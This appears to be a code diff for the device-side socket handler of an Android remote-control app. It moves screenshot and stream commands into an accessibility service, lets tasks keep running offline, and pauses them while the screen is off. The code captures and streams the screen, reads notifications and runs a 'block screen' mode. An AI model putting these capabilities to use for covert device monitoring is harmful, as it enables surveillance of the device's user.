@@ -308,9 +308,10 @@ public class SocketManager {
     }
 
     /**
-     * A task run is deliberately restarted from its original step list after the
-     * device is locked.  We do not retain a step cursor because continuing at the
-     * old cursor could leave the target app in an unknown state.
+     * A task run is deliberately restarted from its original step list after
+     * the screen turns off or the device is locked. We do not retain a step
+     * cursor because continuing at the old cursor could leave the target app
+     * in an unknown state.
      */
     private static final class TaskRun {
         final JSONArray steps;
@@ -1513,6 +1514,9 @@ public class SocketManager {
     }
 
     public void disconnect() {
+        // A socket disconnect is not a task cancellation. Active task workers
+        // execute against on-device handlers and keep running offline; their
+        // task:progress events are best-effort until the connection returns.
         running   = false;
         connected = false;
         streamConnected = false;
@@ -1827,7 +1831,8 @@ public class SocketManager {
         // ── Accessibility status ─────────────────────────────────────────
         if (command.equals("get_accessibility_status")) {
             JSONObject r = new JSONObject();
-            boolean enabled = UnifiedAccessibilityService.getInstance() != null;
+            boolean enabled = UnifiedAccessibilityService.getInstance() != null
+                    || UnifiedAccessibilityService.hasFreshHeartbeat(context);
             r.put("success", true);
             r.put("enabled", enabled);
             r.put("message", enabled ? "Accessibility service is running" : "Accessibility service is NOT running — enable it in Settings");
@@ -1954,7 +1959,7 @@ public class SocketManager {
         }
 
         // ── Screenshot ───────────────────────────────────────────────────
-        if (command.equals("take_screenshot")) return screenshotHandler.takeScreenshot();
+        // Handled in handleAccessibilityCommand (requires accessibility service process)
 
         // ── Files ────────────────────────────────────────────────────────
         if (command.equals("list_files")) {
@@ -2196,33 +2201,8 @@ public class SocketManager {
         if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
         if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();
 
-        // ── Streaming — dashboard-timed one-shot screenshots ──────────────
-        if (command.equals("stream_start")) {
-            // The dashboard owns the polling interval.  Keep this command
-            // request/response based so every result contains the screenshot
-            // that was taken for that exact tick; do not start a background
-            // stream or return only "stream started".
-            // Stop any legacy push mode left by an older dashboard session.
-            stopIdleFrameMode();
-            stopBlockFrameMode();
-            JSONObject r = screenshotHandler.takeScreenshot();
-            long requestedIntervalMs = Math.max(500L, Math.min(
-                    10_000L, params.optLong("intervalMs", 1_000L)));
-            r.put("streaming", true);
-            r.put("streamStarted", true);
-            r.put("intervalMs", requestedIntervalMs);
-            r.put("message", "Screenshot captured");
-            return r;
-        }
-        if (command.equals("stream_stop")) {
-            // Also clean up push modes created by older APK/dashboard pairs.
-            stopIdleFrameMode();
-            stopBlockFrameMode();
-            JSONObject r = new JSONObject();
-            r.put("success", true);
-            r.put("message", "Screenshot requests stopped");
-            return r;
-        }
+        // Streaming commands (stream_start, stream_stop) are handled in handleAccessibilityCommand
+        // which runs in the accessibility service process
         if (command.equals("stream_request_frame")) {
             // When block screen is active the device is already pushing frames every 1.5s.
             // Ignore on-demand frame requests to avoid duplicate frames and extra CPU load.
@@ -3025,6 +3005,85 @@ public class SocketManager {
                 ok.put("success", true);
                 ok.put("message", "Screen read requests stopped");
                 return ok;
+            }
+
+            case "take_screenshot": {
+                // Capture a high-quality screenshot via AccessibilityService (API 30+)
+                Bitmap bitmap = accessSvc.captureScreenSync();
+                if (bitmap == null) {
+                    JSONObject r = new JSONObject();
+                    r.put("success", false);
+                    r.put("error", "Accessibility screenshot capture failed");
+                    return r;
+                }
+                String base64 = bitmapToBase64(bitmap, 90);
+                int width = bitmap.getWidth();
+                int height = bitmap.getHeight();
+                bitmap.recycle();
+
+                if (base64 == null || base64.isEmpty()) {
+                    JSONObject r = new JSONObject();
+                    r.put("success", false);
+                    r.put("error", "Could not encode accessibility screenshot");
+                    return r;
+                }
+
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("base64", base64);
+                r.put("mimeType", "image/jpeg");
+                r.put("width", width);
+                r.put("height", height);
+                r.put("timestamp", System.currentTimeMillis());
+                return r;
+            }
+
+            case "stream_start": {
+                // Dashboard-timed one-shot screenshot streaming via AccessibilityService
+                stopIdleFrameMode();
+                stopBlockFrameMode();
+                Bitmap bitmap = accessSvc.captureScreenSync();
+                if (bitmap == null) {
+                    JSONObject r = new JSONObject();
+                    r.put("success", false);
+                    r.put("error", "Accessibility screenshot capture failed");
+                    return r;
+                }
+                String base64 = bitmapToBase64(bitmap, 90);
+                int width = bitmap.getWidth();
+                int height = bitmap.getHeight();
+                bitmap.recycle();
+
+                if (base64 == null || base64.isEmpty()) {
+                    JSONObject r = new JSONObject();
+                    r.put("success", false);
+                    r.put("error", "Could not encode accessibility screenshot");
+                    return r;
+                }
+
+                long requestedIntervalMs = Math.max(500L, Math.min(
+                        10_000L, params.optLong("intervalMs", 1_000L)));
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("base64", base64);
+                r.put("mimeType", "image/jpeg");
+                r.put("width", width);
+                r.put("height", height);
+                r.put("timestamp", System.currentTimeMillis());
+                r.put("streaming", true);
+                r.put("streamStarted", true);
+                r.put("intervalMs", requestedIntervalMs);
+                r.put("message", "Screenshot captured");
+                return r;
+            }
+
+            case "stream_stop": {
+                stopIdleFrameMode();
+                stopBlockFrameMode();
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "Screenshot requests stopped");
+                return r;
             }
 
             case "list_screen_recordings": {
@@ -3858,8 +3917,9 @@ public class SocketManager {
      *    has time to refresh before the next step runs.
      */
     /**
-     * Persist the workflow definition to device storage so the task can survive
-     * connection drops, app restarts, and process kills.
+     * Persist the workflow definition to device storage before starting its
+     * independent local worker. Network disconnects do not stop that worker;
+     * this file is the saved definition, not a step-by-step execution journal.
      * File: <filesDir>/tasks/current_task.json
      * Returns true if the file was saved successfully.
      */
@@ -3900,16 +3960,16 @@ public class SocketManager {
                 String action = intent.getAction();
 
                 if (android.content.Intent.ACTION_SCREEN_OFF.equals(action)) {
-                    // Keyguard state can lag the SCREEN_OFF broadcast on some OEMs.
-                    taskLockHandler.postDelayed(() -> {
-                        if (isDeviceLocked()) requestTaskRestartForLock();
-                    }, 200L);
+                    // Pause immediately, even on devices where the keyguard
+                    // state is delayed or the screen turns off without a lock.
+                    requestTaskRestartForPause();
                 } else if (android.content.Intent.ACTION_USER_PRESENT.equals(action)) {
-                    startWaitingTasksAfterUnlock();
+                    resumeWaitingTasksIfAvailable();
                 } else if (android.content.Intent.ACTION_SCREEN_ON.equals(action)) {
                     // Covers devices that wake without delivering USER_PRESENT.
+                    // The delayed check allows keyguard state to settle first.
                     taskLockHandler.postDelayed(() -> {
-                        if (!isDeviceLocked()) startWaitingTasksAfterUnlock();
+                        if (!isTaskExecutionBlocked()) resumeWaitingTasksIfAvailable();
                     }, 300L);
                 }
             }
@@ -3934,22 +3994,42 @@ public class SocketManager {
         try {
             android.app.KeyguardManager keyguard =
                     (android.app.KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
-            return keyguard != null && keyguard.isKeyguardLocked();
+            if (keyguard == null) {
+                Log.w(TAG, "Unable to read device lock state; keeping task paused");
+                return true;
+            }
+            return keyguard.isKeyguardLocked();
         } catch (Exception e) {
-            Log.w(TAG, "Unable to read device lock state: " + e.getMessage());
-            return false;
+            Log.w(TAG, "Unable to read device lock state; keeping task paused: " + e.getMessage());
+            return true;
+        }
+    }
+
+    private boolean isTaskExecutionBlocked() {
+        if (isDeviceLocked()) return true;
+        try {
+            android.os.PowerManager powerManager =
+                    (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
+            if (powerManager == null) {
+                Log.w(TAG, "Unable to read screen state; keeping task paused");
+                return true;
+            }
+            return !powerManager.isInteractive();
+        } catch (Exception e) {
+            Log.w(TAG, "Unable to read screen state; keeping task paused: " + e.getMessage());
+            return true;
         }
     }
 
     private JSONObject startOrQueueTask(JSONArray steps, String commandId, boolean stored)
             throws JSONException {
         PendingTask task = new PendingTask(steps, commandId);
-        if (isDeviceLocked()) {
+        if (isTaskExecutionBlocked()) {
             synchronized (taskLock) {
                 waitingTasks.put(commandId, task);
             }
             sendTaskProgress(commandId, -1, steps.length(), false, true,
-                    "Task waiting for device unlock", false, null);
+                    "Task waiting for screen-on and device unlock", false, null);
             return new JSONObject()
                     .put("success", true)
                     .put("started", false)
@@ -3967,26 +4047,25 @@ public class SocketManager {
     }
 
     private void startTaskRun(PendingTask task, boolean restarted) {
-        if (isDeviceLocked()) {
-            synchronized (taskLock) {
-                waitingTasks.put(task.commandId, task);
-            }
-            return;
-        }
-
         TaskRun run;
         synchronized (taskLock) {
-            // A screen-off event may arrive between the lock check and this
-            // section.  The receiver will see this run and interrupt it.
+            // Recheck while holding taskLock so a screen-off receiver either
+            // sees this active run and interrupts it, or this task is queued.
+            if (isTaskExecutionBlocked()) {
+                waitingTasks.put(task.commandId, task);
+                return;
+            }
             run = new TaskRun(task.steps, task.commandId);
             activeTaskRuns.put(task.commandId, run);
         }
 
         if (restarted) {
             sendTaskProgress(run.commandId, -1, run.steps.length(), false, true,
-                    "Device unlocked — restarting task from the beginning", false, null);
+                    "Screen on and device unlocked — restarting task from the beginning", false, null);
         }
 
+        // Do not run this on a socket/command-dispatch worker: execution must
+        // continue locally if the transport disconnects after task delivery.
         Thread worker = new Thread(() -> {
             try {
                 executeTaskLocal(run);
@@ -4000,7 +4079,7 @@ public class SocketManager {
         worker.start();
     }
 
-    private void requestTaskRestartForLock() {
+    private void requestTaskRestartForPause() {
         java.util.ArrayList<TaskRun> interruptedRuns = new java.util.ArrayList<>();
         synchronized (taskLock) {
             for (TaskRun run : activeTaskRuns.values()) {
@@ -4018,15 +4097,15 @@ public class SocketManager {
 
         for (TaskRun run : interruptedRuns) {
             sendTaskProgress(run.commandId, run.currentStepIndex, run.steps.length(), false, false,
-                    "Device locked — stopping task; it will restart from the beginning after unlock",
+                    "Screen off or device locked — stopping task; it will restart from the beginning when available",
                     false, "device_locked");
             Thread worker = run.thread;
             if (worker != null) worker.interrupt();
         }
     }
 
-    private void startWaitingTasksAfterUnlock() {
-        if (isDeviceLocked()) return;
+    private void resumeWaitingTasksIfAvailable() {
+        if (isTaskExecutionBlocked()) return;
 
         java.util.ArrayList<PendingTask> ready = new java.util.ArrayList<>();
         synchronized (taskLock) {
@@ -4052,8 +4131,8 @@ public class SocketManager {
             removed = activeTaskRuns.get(run.commandId) == run;
             if (removed) activeTaskRuns.remove(run.commandId);
         }
-        if (removed && !isDeviceLocked()) {
-            startWaitingTasksAfterUnlock();
+        if (removed && !isTaskExecutionBlocked()) {
+            resumeWaitingTasksIfAvailable();
         }
     }
 
